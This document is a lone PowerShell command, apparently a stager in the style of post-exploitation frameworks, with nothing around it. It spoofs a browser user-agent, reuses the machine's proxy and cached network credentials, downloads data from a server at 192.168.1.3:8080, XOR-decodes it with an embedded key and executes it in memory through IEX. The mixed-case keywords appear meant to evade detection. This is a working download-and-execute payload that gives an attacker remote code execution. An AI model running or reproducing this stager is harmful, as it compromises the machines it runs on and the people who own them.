
$wc=NEW-ObJEcT SysTeM.Net.WEBClIenT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wc.HEadERS.AdD('User-Agent',$u);$wC.PrOxy = [SystEm.Net.WeBRequEst]::DEfaultWeBProXy;$Wc.PrOxy.CREdEnTIaLs = [SyStem.NEt.CrEDenTiALCacHe]::DefauLTNetwORkCReDENtIalS;$K='pEv=HxFmTo.dOqVZz~kaiC{-+;S)U1X3';$I=0;[char[]]$b=([ChAR[]]($WC.DoWNLoaDSTRIng("http://192.168.1.3:8080/index.asp")))|%{$_-bXor$K[$I++%$K.Length]};IEX ($b-jOIn'')

